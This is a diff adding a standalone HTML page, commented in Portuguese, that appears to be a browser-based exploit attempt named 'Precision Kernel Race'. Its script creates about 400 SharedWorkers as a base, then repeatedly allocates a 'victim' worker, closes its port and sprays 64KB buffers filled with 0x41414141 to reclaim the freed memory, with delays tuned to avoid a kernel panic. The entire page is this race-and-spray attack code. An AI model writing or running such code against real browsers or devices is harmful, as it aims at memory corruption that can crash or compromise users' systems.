@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Precision Kernel Race</title>
+</head>
+<body>
+
+    <h1>Precision Race (Ping-Pong 400-401)</h1>
+    <p>Target: 400 Base -> Alloc 1 -> Kill 1 -> Spray -> Wait</p>
+
+    <div id="log">Ready.<br></div>
+    <button onclick="runPrecisionTest()">START SURGICAL RACE</button>
+
+    <script>
+        const BASE_LIMIT = 400; // Onde começa o lag
+        const SPRAY_SIZE = 1024 * 64; // 64KB chunks
+        
+        let fillers = [];
+        let cycle = 0;
+        let isRunning = false;
+
+        function log(msg) {
+            const el = document.getElementById('log');
+            el.innerHTML = `> ${msg}<br>` + el.innerHTML;
+        }
+
+        async function runPrecisionTest() {
+            if (isRunning) return;
+            isRunning = true;
+            
+            if (!window.SharedWorker) return log("SharedWorker not supported.");
+
+            // FASE 1: BASE FILL (Encher até 400)
+            log(`Preenchendo base até ${BASE_LIMIT}...`);
+            
+            let count = 0;
+            const fillInterval = setInterval(() => {
+                for(let i=0; i<5; i++) {
+                    if (count >= BASE_LIMIT) {
+                        clearInterval(fillInterval);
+                        log("Base atingida. Estabilizando por 2 segundos...");
+                        setTimeout(startSurgicalLoop, 2000);
+                        return;
+                    }
+                    try {
+                        const sw = new SharedWorker("data:text/javascript,onconnect=e=>e.ports[0].start()", "base_" + count);
+                        sw.port.start();
+                        fillers.push(sw);
+                        count++;
+                    } catch(e) {
+                        clearInterval(fillInterval);
+                        log("Erro na base: " + e.message);
+                    }
+                }
+            }, 10);
+        }
+
+        async function startSurgicalLoop() {
+            log("=== INICIANDO MODO CIRÚRGICO ===");
+            log("Ciclo: Alloc 401 -> Close -> Spray -> Wait");
+
+            // Loop infinito controlado por recursão (não trava a thread)
+            processCycle();
+        }
+
+        function processCycle() {
+            cycle++;
+            
+            // 1. ALOCAR A VÍTIMA (O worker 401)
+            let victim = null;
+            try {
+                // Nome único a cada ciclo para garantir nova alocação
+                victim = new SharedWorker("data:text/javascript,onconnect=e=>e.ports[0].start()", "victim_" + cycle);
+                victim.port.start();
+            } catch(e) {
+                log(`Falha ao criar vítima no ciclo ${cycle}. Kernel cheio?`);
+                // Se falhar, espera um pouco e tenta de novo
+                setTimeout(processCycle, 1000);
+                return;
+            }
+
+            // 2. A CORRIDA (Kill & Spray)
+            // Não usamos setTimeout aqui para ser o mais rápido possível
+            victim.port.close();
+            
+            // Removemos a referência JS imediatamente
+            victim = null; 
+
+            // 3. SPRAY (Tentar pegar o slot liberado)
+            try {
+                // Criamos um array local temporário
+                const spray = new Uint32Array(SPRAY_SIZE).fill(0x41414141);
+                // Força o acesso para garantir alocação física
+                let x = spray[0]; 
+            } catch(e) {}
+
+            // Atualiza log visualmente a cada 10 ciclos para não lagar mais ainda
+            if (cycle % 10 === 0) log(`Ciclos: ${cycle} (Sistema Vivo)`);
+
+            // 4. COOLDOWN (O Segredo)
+            // Esperamos 200ms para garantir que o Kernel limpou a sujeira.
+            // Isso impede que acumulemos lixo e causemos o panic de 405.
+            setTimeout(processCycle, 200); 
+        }
+
+    </script>
+</body>
+</html>
